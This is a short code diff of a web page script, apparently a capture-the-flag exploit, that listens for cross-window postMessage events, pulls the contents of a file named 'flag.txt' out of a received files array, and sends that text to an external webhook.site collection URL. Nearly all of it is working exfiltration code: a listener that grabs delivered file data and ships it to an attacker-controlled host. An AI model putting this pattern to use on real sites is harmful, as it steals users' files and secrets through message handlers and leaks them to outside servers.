@@ -2,14 +2,13 @@
 
 <script>
 window.addEventListener("message", async (event) => {
-  console.log("message received:", event.data);
+  if (event.data?.files) {
+    console.log("📨 Files received:", event.data.files);
 
-  // If you want to accept any message containing a 'files' array with a 'flag.txt'
-  if (event.data && Array.isArray(event.data.files)) {
     const file = event.data.files.find(f => f.name === "flag.txt");
     if (file?.blob) {
       const text = await file.blob.text();
-      console.log("FLAG:", text);
+      console.log("🏁 FLAG:", text);
 
       fetch("https://webhook.site/e1c8db75-b5b5-47fd-a911-4a02b687c456/collect?flag=" + encodeURIComponent(text), {
         method: "GET",
